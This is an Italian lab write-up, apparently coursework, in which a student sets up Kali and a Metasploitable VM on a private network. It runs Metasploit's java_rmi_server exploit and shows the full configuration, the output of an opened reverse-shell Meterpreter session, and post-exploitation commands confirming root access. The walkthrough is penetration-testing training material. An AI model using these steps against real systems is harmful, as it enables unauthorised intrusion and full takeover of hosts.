
1) operazioni per cambio ip della meta
```text
    sudo ifconfig eth0 192.168.11.112 netmask 255.255.255.0
    sudo ip route add default via 192.168.11.1
    sudo nano /etc/network/interfaces

    auto eth0
    iface eth0 inet static
        address 192.168.11.112
        netmask 255.255.255.0
        gateway 192.168.11.1

sudo reboot
```
2) cambio ip kali
```text
    tasto destro sul menu in alto, quello con i lsimbolo di un connettore ethernet
    edit setting
    io ho 2 interfacce create una dinamica (DHCP) e una statica
    premo la statica e poi l'ingranaggio nella parte in basso
    entro nel menu IPv4 e metto come ip manuale:
        IP -> 192.168.11.111
        cidr -> 24
        Gateway -> 192.168.11.1
```
3) test della connession con un ping 
```text
    ping -c 4 192.168.11.112 (from kali to meta)
```
3) facciamo un piccolo scan con nmap di cosa c'è nella rete come se non sapessi che indirizzo ha

4) dopo avere verificato che c'è effettivamente l'ip che mi aspetta faccio un nmap piu mirato per vedere anche la versione dei software che ci sono i nquelle porte

5) avvio metasploit (framework)

6) faccio un cerca per vedere se c'è qualche exploit in merito alla consegna 
```text
search java_rmi

Risultato:
    0  auxiliary/gather/java_rmi_registry              .                normal     No     Java RMI Registry Interfaces Enumeration
    1  exploit/multi/misc/java_rmi_server              2011-10-15       excellent  Yes    Java RMI Server Insecure Default Configuration Java Code Execution
    2    \_ target: Generic (Java Payload)             .                .          .      .
    3    \_ target: Windows x86 (Native Payload)       .                .          .      .
    4    \_ target: Linux x86 (Native Payload)         .                .          .      .
    5    \_ target: Mac OS X PPC (Native Payload)      .                .          .      .
    6    \_ target: Mac OS X x86 (Native Payload)      .                .          .      .
    7  auxiliary/scanner/misc/java_rmi_server          2011-10-15       normal     No     Java RMI Server Insecure Endpoint Code Execution Scanner
    8  exploit/multi/browser/java_rmi_connection_impl  2010-03-31       excellent  No     Java RMIConnectionImpl Deserialization Privilege Escalation
```
7) dopo aver scelto l'exploit con il comanod show options vedo cosa serve per configurarlo
```text
    set RHOSTS 192.168.11.112
    set RPORT 1099
    set LHOST 192.168.11.111
```
8) lancio il comando per runnare l'exploit
```text
    exploit

    Risultato:
    [*] Started reverse TCP handler on 192.168.11.111:4444 
    [*] 192.168.11.112:1099 - Using URL: http://192.168.11.111:8080/OtCxlw5N5k117ib
    [*] 192.168.11.112:1099 - Server started.
    [*] 192.168.11.112:1099 - Sending RMI Header...
    [*] 192.168.11.112:1099 - Sending RMI Call...
    [*] 192.168.11.112:1099 - Replied to request for payload JAR
    [*] Sending stage (58073 bytes) to 192.168.11.112
    [*] Meterpreter session 1 opened (192.168.11.111:4444 -> 192.168.11.112:40228) at 2026-07-24 10:31:12 +0200
```
9) ora vado a lanciare i comandi per avere un po di verifiche sulla macchina
```text
    meterpreter > ipconfig

    Interface  1
    ============
    Name         : lo - lo
    Hardware MAC : 00:00:00:00:00:00
    IPv4 Address : 127.0.0.1
    IPv4 Netmask : 255.0.0.0
    IPv6 Address : ::1
    IPv6 Netmask : ::


    Interface  2
    ============
    Name         : eth0 - eth0
    Hardware MAC : 00:00:00:00:00:00
    IPv4 Address : 192.168.11.112
    IPv4 Netmask : 255.255.255.0
    IPv6 Address : fe80::a00:27ff:fe47:ff99
    IPv6 Netmask : ::

    meterpreter > route

    IPv4 network routes
    ===================

        Subnet          Netmask        Gateway  Metric  Interface
        ------          -------        -------  ------  ---------
        127.0.0.1       255.0.0.0      0.0.0.0
        192.168.11.112  255.255.255.0  0.0.0.0


    IPv6 network routes
    ===================

        Subnet                    Netmask  Gateway  Metric  Interface
        ------                    -------  -------  ------  ---------
        ::1                       ::       ::
        fe80::a00:27ff:fe47:ff99  ::       ::
    meterpreter > sysinfo
    Computer        : metasploitable
    OS              : Linux 2.6.24-16-server (i386)
    Architecture    : x86
    System Language : en_US
    Meterpreter     : java/linux
    meterpreter > getuid
    Server username: root
```